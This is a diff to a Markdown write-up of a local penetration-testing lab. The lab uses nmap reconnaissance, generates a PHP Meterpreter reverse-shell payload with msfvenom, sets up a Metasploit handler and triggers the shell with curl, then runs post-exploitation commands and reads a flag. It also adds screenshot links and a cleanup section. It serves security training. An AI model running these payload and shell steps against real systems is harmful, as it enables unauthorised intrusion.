@@ -80,7 +80,7 @@ The penetration testing process followed standard offensive security methodology
 
 # Step-by-Step Workflow
 
-## 1. Environment Preparation
+# 1. Environment Preparation
 
 Installed required penetration testing tools and dependencies.
 
@@ -89,9 +89,13 @@ sudo apt update
 sudo apt install -y ruby-full nmap netcat-traditional iproute2 php
 ```
 
+## Screenshot
+
+![Environment Setup](screenshots/1.Prepare%20the%20environment.png)
+
 ---
 
-## 2. Simulating Vulnerable Environment
+# 2. Simulating Vulnerable Environment
 
 Created simulated users and vulnerable PHP upload directory.
 
@@ -100,19 +104,50 @@ sudo adduser victim --disabled-password --gecos ""
 sudo adduser webuser --disabled-password --gecos ""
 ```
 
+## Screenshot
+
+![Victim User Creation](screenshots/2-2.1.Create%20victim%20users%20and%20a%20simulated%20vulnerable%20web%20app.png)
+
 ---
 
-## 3. Running Fake Internal TCP Service
+# 3. Running Fake Internal TCP Service
 
-Created and started a custom Python-based Echo service on port 9003.
+## 3.1 Create the Fake Server Script
+
+Created a custom Python-based Echo service.
+
+## Screenshot
+
+![Fake Service Script](screenshots/2-2.2.Create%20the%20fake%20server%20script.png)
+
+---
+
+## 3.2 Make it Executable and Run
+
+```bash
+sudo chmod +x /home/victim/fake_service.py
+sudo -u victim nohup python3 /home/victim/fake_service.py &
+```
+
+## Screenshot
+
+![Fake Service Running](screenshots/2-2.3.Make%20it%20executable%20and%20run.png)
+
+---
+
+## 3.3 Test Service Behaviour
 
 ```bash
 nc 127.0.0.1 9003
 ```
 
+## Screenshot
+
+![Echo Service Test](screenshots/2-2.4.Test%20its%20behaviour.png)
+
 ---
 
-## 4. Reconnaissance Using Nmap
+# 4. Reconnaissance Using Nmap
 
 Performed service discovery and enumeration.
 
@@ -128,9 +163,13 @@ nmap -p 22,8080,9003 127.0.0.1
 | 8080 | PHP Web Server |
 | 9003 | Echo TCP Service |
 
+## Screenshot
+
+![Nmap Scan](screenshots/3.Perform%20reconniassance.png)
+
 ---
 
-## 5. Payload Generation
+# 5. Payload Generation
 
 Generated a Meterpreter reverse shell payload using msfvenom.
 
@@ -142,11 +181,27 @@ LPORT=4443 \
 -o shell.php
 ```
 
+## Screenshot
+
+![Payload Generation](screenshots/4-4.1.Generate%20a%20Meterpreter%20reverse%20shell%20in%20PHP.png)
+
 ---
 
-## 6. Metasploit Handler Setup
+# 6. Metasploit Handler Setup
 
-Started Metasploit listener.
+## 6.1 Start Metasploit
+
+```bash
+msfconsole
+```
+
+## Screenshot
+
+![Metasploit Console](screenshots/4-4.2.Start%20Msfconsole.png)
+
+---
+
+## 6.2 Configure Multi Handler
 
 ```bash
 use exploit/multi/handler
@@ -156,9 +211,25 @@ set LPORT 4443
 run
 ```
 
+## Screenshot
+
+![Metasploit Handler](screenshots/4-4.3.Inside%20Metasploit.png)
+
 ---
 
-## 7. Exploitation
+# 7. Start PHP Web Server
+
+```bash
+sudo -u webuser php -S 127.0.0.1:8080 -t /home/webuser/web/uploads
+```
+
+## Screenshot
+
+![PHP Web Server](screenshots/4-4.4.Start%20PHP%20web%20server.png)
+
+---
+
+# 8. Exploitation
 
 Triggered the vulnerable PHP payload.
 
@@ -168,9 +239,15 @@ curl http://127.0.0.1:8080/shell.php
 
 Successfully established a Meterpreter session.
 
+## Screenshot
+
+![Trigger Payload](screenshots/4-4.5.Trigger%20the%20shell.png)
+
 ---
 
-## 8. Post-Exploitation
+# 9. Post-Exploitation
+
+## 9.1 Meterpreter Enumeration
 
 Executed Meterpreter commands:
 
@@ -181,7 +258,13 @@ ls
 cat flag.txt
 ```
 
-Spawned interactive shell:
+## Screenshot
+
+![Meterpreter Session](screenshots/5-5.1.Inside%20Meterpreter.png)
+
+---
+
+## 9.2 Interactive Shell Access
 
 ```bash
 shell
@@ -190,11 +273,15 @@ id
 uname -a
 ```
 
+## Screenshot
+
+![Shell Access](screenshots/5-5.2.Drop%20to%20a%20shell.png)
+
 ---
 
 # Vulnerabilities Identified
 
-## 1. Remote Code Execution (Critical)
+# 1. Remote Code Execution (Critical)
 
 | Attribute | Value |
 |---|---|
@@ -212,7 +299,7 @@ uname -a
 
 ---
 
-## 2. Exposed Internal TCP Service (Medium)
+# 2. Exposed Internal TCP Service (Medium)
 
 | Attribute | Value |
 |---|---|
@@ -228,22 +315,13 @@ uname -a
 
 ---
 
-# Screenshots
+# Cleanup
 
-## Environment Setup
-(Add Screenshot)
+Stopped all services and removed simulated users.
 
-## Nmap Reconnaissance
-(Add Screenshot)
+## Screenshot
 
-## Meterpreter Session
-(Add Screenshot)
-
-## Flag Retrieval
-(Add Screenshot)
-
-## Cleanup
-(Add Screenshot)
+![Cleanup](screenshots/Cleanup.png)
 
 ---
 
